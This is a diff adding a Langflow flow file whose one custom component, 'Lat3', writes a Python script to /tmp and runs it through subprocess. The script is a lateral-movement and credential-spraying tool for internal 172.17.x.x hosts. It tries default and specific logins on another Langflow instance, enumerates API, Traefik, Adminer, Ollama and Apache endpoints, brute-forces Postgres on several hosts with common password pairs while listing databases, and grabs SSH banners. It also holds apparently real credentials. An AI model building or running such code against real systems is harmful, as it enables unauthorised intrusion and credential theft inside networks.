@@ -1,0 +1,132 @@
+{
+  "id": "d22b1a25-7275-4832-8476-865cb2156f93",
+  "data": {
+    "edges": [],
+    "nodes": [
+      {
+        "id": "L3-58bab",
+        "data": {
+          "id": "L3-58bab",
+          "node": {
+            "beta": false,
+            "icon": "code",
+            "edited": false,
+            "frozen": false,
+            "legacy": false,
+            "pinned": false,
+            "outputs": [
+              {
+                "name": "output",
+                "cache": true,
+                "types": [
+                  "Message"
+                ],
+                "value": "__UNDEFINED__",
+                "hidden": null,
+                "method": "go",
+                "options": null,
+                "selected": "Message",
+                "tool_mode": true,
+                "loop_types": null,
+                "allows_loop": false,
+                "display_name": "Output",
+                "group_outputs": false,
+                "required_inputs": null
+              }
+            ],
+            "metadata": {
+              "module": "custom_components.lat3",
+              "code_hash": "d5a148ae67bb",
+              "dependencies": {
+                "dependencies": [
+                  {
+                    "name": "langflow",
+                    "version": "0.7.3"
+                  }
+                ],
+                "total_dependencies": 1
+              }
+            },
+            "template": {
+              "code": {
+                "info": "",
+                "list": false,
+                "name": "code",
+                "show": true,
+                "type": "code",
+                "value": "\nfrom langflow.custom import Component\nfrom langflow.io import Output, MessageTextInput\nfrom langflow.schema.message import Message\nimport subprocess\n\nclass Lat3(Component):\n    display_name=\"Lat3\"; description=\"d\"; icon=\"code\"; name=\"Lat3\"\n    inputs=[MessageTextInput(name=\"input_value\", display_name=\"Input\", value=\"x\")]\n    outputs=[Output(name=\"output\", display_name=\"Output\", method=\"go\")]\n    def go(self) -> Message:\n        py=r\"\"\"\nimport socket, urllib.request, ssl, json, psycopg2, subprocess, urllib.error\nctx=ssl._create_unverified_context()\nprint('lat3-start')\n \n\ndef http(url, headers=None, timeout=6, data=None, method=None):\n    h={'User-Agent':'Mozilla/5.0','Accept':'*/*'}\n    if headers: h.update(headers)\n    r=urllib.request.Request(url, data=data, headers=h, method=method)\n    try:\n        with urllib.request.urlopen(r, context=ctx, timeout=timeout) as resp:\n            return resp.status, dict(resp.headers), resp.read(500)\n    except urllib.error.HTTPError as e:\n        try: body=e.read(500)\n        except: body=b''\n        return e.code, dict(e.headers), body\n    except Exception as e:\n        return 0, {}, str(e).encode()\n\nprint('=== SECOND LANGFLOW 172.17.3.11 ===')\nfor path in ['/api/v1/version','/api/v1/auto_login','/health']:\n    st,h,b=http('http://172.17.3.11:7860'+path)\n    print(st, path, b[:200])\n# default login\nimport urllib.parse\ndata=urllib.parse.urlencode({'username':'langflow','password':'langflow'}).encode()\nst,h,b=http('http://172.17.3.11:7860/api/v1/login', data=data, headers={'Content-Type':'application/x-www-form-urlencoded'}, method='POST')\nprint('lf2 login', st, b[:250])\ndata=urllib.parse.urlencode({'username':'bci','password':'bc1lab@AIT'}).encode()\nst,h,b=http('http://172.17.3.11:7860/api/v1/login', data=data, headers={'Content-Type':'application/x-www-form-urlencoded'}, method='POST')\nprint('lf2 bci', st, b[:250])\n\nprint('=== FRONTEND 172.17.3.5:3000 ===')\nfor path in ['/','/api/health','/api/status','/api/version','/login','/docs','/openapi.json']:\n    st,h,b=http('http://172.17.3.5:3000'+path, timeout=8)\n    print(st, path, h.get('Server',''), b[:180])\nst,h,b=http('http://frontend:3000/', timeout=8)\nprint('frontend name', st, b[:180])\n\nprint('=== API 172.17.3.9:8000 ===')\nfor path in ['/','/docs','/openapi.json','/health','/api','/api/v1','/redoc','/status']:\n    st,h,b=http('http://172.17.3.9:8000'+path, timeout=8)\n    print(st, path, b[:200])\nst,h,b=http('http://api:8000/docs', timeout=8)\nprint('api name docs', st, b[:200])\n\nprint('=== APACHE 172.17.3.8:80 ===')\nst,h,b=http('http://172.17.3.8/', timeout=5)\nprint(st, h.get('Server'), b)\nfor path in ['/index.html','/status','/health','.env','/server-status']:\n    st,h,b=http('http://172.17.3.8'+path)\n    print(st, path, b[:120])\n\nprint('=== TRAEFIK 172.17.3.2 ===')\nfor url in [\n 'http://172.17.3.2:8080/dashboard/',\n 'http://172.17.3.2:8080/api/version',\n 'http://172.17.3.2:8080/api/overview',\n 'http://172.17.3.2:8080/api/http/routers',\n 'http://172.17.3.2:8080/api/http/services',\n 'http://172.17.3.2:8080/api/rawdata',\n]:\n    st,h,b=http(url, timeout=5)\n    print(st, url, b[:220])\n\nprint('=== ADMINER both ===')\nfor base in ['http://172.17.1.6:8080/','http://172.17.3.7:8080/']:\n    st,h,b=http(base)\n    print(st, base, b[:120])\n\nprint('=== OLLAMA both ===')\nfor base in ['http://172.17.1.5:11434/api/tags','http://172.17.3.10:11434/api/tags']:\n    st,h,b=http(base)\n    print(st, base, b[:250])\n\nprint('=== POSTGRES sweep known creds ===')\ncreds=[\n ('myuser','mypassword'),\n ('myuser','password'),\n ('postgres','postgres'),\n ('postgres','mypassword'),\n ('postgres','password'),\n ('langflow','langflow'),\n ('root','root'),\n]\nhosts=['172.17.1.3','172.17.1.4','172.17.3.2','172.17.3.6','172.17.3.12','172.17.0.1','172.17.1.1','172.17.3.1']\nimport psycopg2\nfor host in hosts:\n  for user,pw in creds:\n    try:\n      c=psycopg2.connect(host=host, port=5432, user=user, password=pw, dbname='postgres', connect_timeout=2)\n      cur=c.cursor(); cur.execute('select version()'); ver=cur.fetchone()[0][:60]\n      cur.execute('select datname from pg_database')\n      dbs=[r[0] for r in cur.fetchall()]\n      print('PGOK', host, user, pw, dbs, ver)\n      c.close()\n    except Exception as e:\n      msg=str(e).split('\\n')[0][:90]\n      if 'timeout' not in msg.lower() and 'Connection refused' not in msg:\n        if 'password authentication failed' not in msg:\n          print('PG', host, user, msg)\n\nprint('=== HOST SSH / GATEWAY ===')\nfor host in ['172.17.0.1','172.17.1.1','172.17.3.1']:\n    try:\n        s=socket.socket(); s.settimeout(2); s.connect((host,22)); print('SSH', host, s.recv(80)); s.close()\n    except Exception as e:\n        print('SSH', host, e)\n# try metadata? no\nprint('DONE_LAT3')\n\"\"\"\n        open('/tmp/lat3.py','w').write(py)\n        return Message(text=subprocess.getoutput('python /tmp/lat3.py'))\n",
+                "dynamic": true,
+                "advanced": true,
+                "password": false,
+                "required": true,
+                "fileTypes": [],
+                "file_path": "",
+                "multiline": true,
+                "title_case": false,
+                "placeholder": "",
+                "load_from_db": false
+              },
+              "_type": "Component",
+              "input_value": {
+                "info": "",
+                "list": false,
+                "name": "input_value",
+                "show": true,
+                "type": "str",
+                "value": "x",
+                "dynamic": false,
+                "advanced": false,
+                "required": false,
+                "tool_mode": false,
+                "title_case": false,
+                "_input_type": "MessageTextInput",
+                "input_types": [
+                  "Message"
+                ],
+                "placeholder": "",
+                "display_name": "Input",
+                "load_from_db": false,
+                "override_skip": false,
+                "list_add_label": "Add More",
+                "trace_as_input": true,
+                "trace_as_metadata": true,
+                "track_in_telemetry": false
+              }
+            },
+            "minimized": false,
+            "tool_mode": false,
+            "description": "d",
+            "field_order": [
+              "input_value"
+            ],
+            "base_classes": [
+              "Message"
+            ],
+            "display_name": "Lat3",
+            "output_types": [],
+            "custom_fields": {},
+            "documentation": "",
+            "conditional_paths": []
+          },
+          "type": "Lat3",
+          "description": "d",
+          "display_name": "Lat3"
+        },
+        "type": "genericNode",
+        "position": {
+          "x": 1,
+          "y": 1
+        }
+      }
+    ],
+    "viewport": {
+      "x": 0,
+      "y": 0,
+      "zoom": 1
+    }
+  },
+  "name": "l3",
+  "updated_at": "2026-08-20 06:30:42.042796",
+  "is_component": false,
+  "endpoint_name": null
+}
